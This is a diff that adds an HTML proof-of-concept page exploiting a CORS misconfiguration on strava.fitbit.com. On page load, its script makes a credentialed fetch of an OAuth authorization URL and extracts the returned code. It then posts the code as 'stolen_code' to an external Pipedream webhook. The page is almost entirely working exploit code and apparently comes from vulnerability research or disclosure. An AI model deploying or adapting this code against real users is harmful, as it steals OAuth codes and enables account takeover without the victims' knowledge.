@@ -1,0 +1,48 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+  <title>Fitbit OAuth CORS Exploit PoC</title>
+</head>
+<body>
+<h2>Fitbit OAuth Exploit PoC</h2>
+<p>Silently stealing OAuth code from strava.fitbit.com via CORS misconfiguration.</p>
+<script>
+(async () => {
+  const evilOrigin = "https://fitbitpoc.netlify.app"; // Attacker domain
+  const redirectUri = "https://eoqb3e0qi0vy2sc.m.pipedream.net";
+  const webhook = "https://eoqb3e0qi0vy2sc.m.pipedream.net"; // Your Pipedream webhook
+
+  const url = `https://strava.fitbit.com/auth/fitbit?response_type=code&client_id=23QPQJ&redirect_uri=${encodeURIComponent(redirectUri)}&scope=activity%20profile`;
+
+  try {
+    const res = await fetch(url, {
+      method: "GET",
+      credentials: "include"
+    });
+
+    const text = await res.text();
+    console.log("[+] Fetched OAuth redirect page");
+
+    const match = text.match(/code=([a-zA-Z0-9]+)/);
+    if (match) {
+      const code = match[1];
+      console.log("[+] OAuth code captured:", code);
+
+      await fetch(webhook, {
+        method: "POST",
+        body: JSON.stringify({ stolen_code: code }),
+        headers: { "Content-Type": "application/json" }
+      });
+
+      alert("OAuth code stolen and sent to webhook: " + code);
+    } else {
+      console.warn("[-] No code=... found in response");
+    }
+  } catch (err) {
+    console.error("[-] Fetch error:", err);
+  }
+})();
+</script>
+</body>
+</html>
+
